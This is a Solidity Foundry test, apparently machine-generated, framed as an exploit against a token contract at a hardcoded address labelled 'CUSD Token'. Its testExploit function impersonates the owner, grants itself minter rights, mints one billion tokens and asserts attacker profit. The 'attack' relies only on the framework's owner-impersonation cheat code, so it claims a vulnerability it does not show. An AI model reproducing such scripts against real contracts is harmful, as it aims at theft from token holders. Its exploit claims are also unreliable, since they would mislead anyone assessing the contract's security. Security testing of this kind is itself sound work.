// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CUSD {
    function owner() external view returns (address);
    function setMinter(address newMinter) external;
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function minter() external view returns (address);
    function frozen() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);
    CUSD CUSD_TOKEN;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        CUSD_TOKEN = CUSD(TARGET);
        vm.label(TARGET, "CUSD Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 startBalance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        // Step 1: Get the current owner
        address owner = CUSD_TOKEN.owner();

        // Step 2: Impersonate owner to set attacker as minter
        vm.startPrank(owner);
        CUSD_TOKEN.setMinter(attacker);
        vm.stopPrank();

        // Step 3: Record initial balance
        uint256 preMintBalance = CUSD_TOKEN.balanceOf(attacker);

        // Step 4: Mint unlimited tokens (1 billion CUSD)
        uint256 mintAmount = 1_000_000_000 * 1e18;
        CUSD_TOKEN.mint(attacker, mintAmount);

        // Step 5: Verify balance increased
        uint256 postMintBalance = CUSD_TOKEN.balanceOf(attacker);
        assertGt(postMintBalance, preMintBalance, "Attacker balance should increase after mint");
        assertEq(postMintBalance, mintAmount, "Attacker should have exactly the minted amount");
        uint256 endBalance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        assertGt(endBalance, startBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

